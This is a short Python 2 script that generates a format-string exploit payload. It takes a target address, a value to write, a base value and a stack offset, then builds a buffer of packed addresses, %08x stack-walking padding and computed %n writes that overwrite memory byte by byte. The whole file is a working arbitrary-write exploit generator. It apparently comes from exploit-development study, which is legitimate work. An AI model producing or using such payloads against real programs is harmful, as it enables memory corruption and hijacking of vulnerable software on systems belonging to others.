import sys
import struct
import argparse

parser = argparse.ArgumentParser(description="Addresses "\
    "should be passed in hexadecimal form (0x12345678)")
parser.add_argument("-o", "--address-to-overwrite", \
    help="The address to overwrite", required=True)
parser.add_argument("-w", "--address-to-write", \
    help="The address to write to memory", required=True)
parser.add_argument("-b", "--base-value",
    help="The base value that gets written to memory without "\
    "when the complete buffer is passed to the program",
    required=True)
parser.add_argument("-n", "--num-dwords",
    help="Number of dwords on the stack before reaching the "\
    "buffer", required=True)
args = parser.parse_args()

# Validate the arguments to make sure they're in the proper forms
try:
    ato = int(args.address_to_overwrite, 16)
    atw = int(args.address_to_write, 16)
    bv = args.base_value
    if bv.startswith("0x"):
        bv = int(bv, 16)
    else:
        bv = int(bv)
    nd = int(args.num_dwords)
except Exception, e:
    parser.print_help()
    print "[!] %s" % e
    sys.exit(1)

# Set it up so we can call %n with %x in between to fill
# the gaps and write the desired address
buf = "%sAAAA%sAAAA%sAAAA%s" % \
    (struct.pack("<I", ato),
     struct.pack("<I", ato+1),
     struct.pack("<I", ato+2),
     struct.pack("<I", ato+3))

# Walk down the stack past the first (n-1) dwords on the stack
# preceding our data to get them out of the way
buf += "%08x"*(nd-1)

# Now we need to format the string so our desired value
# ends up at the desired address

# Get our desired byte values at each location
byte1 = (atw & 0x000000ff)
byte2 = (atw & 0x0000ff00) >> 8
byte3 = (atw & 0x00ff0000) >> 16
byte4 = (atw & 0xff000000) >> 24
# List of desired bytes (dbytes)
dbytes = [byte1, byte2, byte3, byte4]

# Find the current byte values before we format anything
cbyte1 = (bv & 0x000000ff)
cbyte2 = (bv & 0x0000ff00) >> 8
cbyte3 = (bv & 0x00ff0000) >> 16
cbyte4 = (bv & 0xff000000) >> 24
# List of current bytes (cbytes)
cbytes = [cbyte1, cbyte2, cbyte3, cbyte4]

# Find the difference between the desired byte value and
# current byte values
num_bytes_written = cbytes[0]
for i in xrange(4):
    dbyte = dbytes[i]
    # Start the padding off at 8 because %08x is our starting value
    padding = 8
    while (num_bytes_written & 0x000000ff) != dbyte:
        num_bytes_written += 1
        padding += 1

    buf += "%" + str(padding) + "x%n"
    # Make sure we reflect this in num_bytes_written
    num_bytes_written += 8

print repr(buf)
